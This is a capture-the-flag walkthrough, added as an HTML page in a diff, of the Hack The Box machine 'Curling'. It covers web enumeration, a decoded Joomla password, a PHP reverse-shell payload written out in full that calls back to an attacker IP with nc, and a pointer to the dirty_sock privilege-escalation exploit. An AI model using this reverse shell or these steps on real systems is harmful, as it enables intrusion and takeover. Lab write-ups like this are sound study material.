@@ -1,0 +1,213 @@
+---
+layout: default
+---
+<body class="wrap">
+  <header>
+  <div class="flexbox">
+    <nav class="main-nav hide-on-mobiles">
+      <ul>
+  <li class="">
+    <a href="/">Home</a>
+  </li>
+  <p>
+  This machine is showing only 2 open ports on TCP and those are 22 and 80. So considering the low amount of open ports prbabily this machine is about enumaration port 80 and it's service than use the result (hopefully a pair of credentials) for accessing the SSH port. 
+  </p>
+</ul>
+
+    </nav>
+  </div>
+</header>
+
+
+    <section class="news">
+    <div class="grid">
+
+
+
+      <div class="unit four-fifths">
+        <article>
+  <h2>
+    Access
+  </h2>
+  <span class="post-category">
+    <span class="label">
+      Walkthroughs
+    </span>
+  </span>
+  <div class="post-meta">
+    <span class="post-date">
+      16 March 2019
+    </span>
+  </div>
+  <p></p>
+  <div class="post-content">
+						<div class="embed-container">
+							<img src="./resources/machine.png" />
+						</div>
+</br>
+						
+    <p><strong>Machine: Curling<br />
+OS: Linux<br />
+IP: 10.10.10.150</strong></p>
+<p>
+	<div>
+<p>As usual I start with a normal enumeration which show only 2 ports: 22 and 80.</p>
+</div><p></p>
+						<div class="embed-container">
+							<img src="./resources/nmap.PNG" />
+						</div>
+</p>
+<div>
+<p>
+Now we start enumeration for this port as a webserver is available and perhaps some directory which we don't know upfront. 
+</br>
+</p>
+</br>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/dirbuster1.png" />
+						</div>
+</p>
+<p>We can look after files as well
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/secret-found.png" />
+						</div>
+</p>
+</br>
+<p>
+	This secret file contain a base64 encoded text.
+</br>
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/secret.png" />
+						</div>
+</p>
+<div>
+<p>
+So decode it to get the password '<b>Curling2018!'</b></p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/secret-decoded.png" />
+						</div>
+</p>
+</br>
+<p>
+	With this and the name which is shown in one of the first post's from webserver you can login to the Joomla interface.
+</p>
+<p>
+	or
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/joomla-login.png" />
+						</div>
+</p>
+<div>
+	<p>
+First I tried to create a new article and post a reverse shell
+</br>
+<i><?php system("rm /tmp/o;mkfifo /tmp/o;cat /tmp/o|/bin/sh -i 2>&1|nc 10.10.15.227 1234 >/tmp/o"); ?></i>
+</br>
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/initialtry.png" />
+						</div>
+</p>
+<div>
+However this didn't seams to work so I decided to edit a less important page such as <i>error.php</i>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/errormanipulation.png" />
+						</div>
+</p>
+<div>
+<p>
+As you can imagine it would have been to easy to have a user shell so fast..
+</br>
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/jailshell.png" />
+						</div>
+</p>
+<div>
+<p>
+	Have a look around an you will notice a file called <i>password_backup</i> which is a hexdump, so we need to parse it with xxd and the decode it.
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/passwordhistory.png" />
+						</div>
+</p>
+</br>
+<div>
+After decoded once you notice it's not done and you need to perform a series of decodings. I have to admit, this took more than 15 mintues to troubleshoot it because extenstions ware not added automaticaly and cause me a bit of confusion.
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/unzipthepassword.png" />
+						</div>
+</p>
+</br>
+<div>
+Than SSH access is granted with <i>floris</i> and <i></i>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/sshaccess.png" />
+						</div>
+					</br>
+					<div class="embed-container">
+							<img src="./resources/userflag.png" />
+						</div>
+</p>
+
+</br>
+<div>
+User flag caught.
+</br>
+<div>
+User to root was much more easier than expected as can be seen: 
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/rootflaginonego.png" />
+						</div>
+</p>
+
+</div>
+
+</br>
+<div>
+Another way to do it is CVE style.
+</br>
+If you are in 2019 and aware of <b>CVE-2019-7304</b></br>
+What is it about? A bug in the <i>snapd</i> API which is a default service that come in Ubuntu instalattion. You can read about it here: <a href="https://initblog.com/2019/dirty-sock/">https://initblog.com/2019/dirty-sock/</a>
+</br>
+and get the exploit from github: <a href="https://github.com/initstring/dirty_sock">https://github.com/initstring/dirty_sock</a>
+</br>
+and run it:
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/cve.png" />
+						</div>
+</p>
+
+<div>
+I hope you enjoyed the write-up and didn't made you wasting time. Drop me a cup of coffee for Sundays (<a href="https://ko-fi.com/y2xhcmtrzw50"> https://ko-fi.com/y2xhcmtrzw50 </a>) or email me kryptoniteclark@protonmail.com :)
+</div>
+</div>
+</article>
+      </div>
+</body>
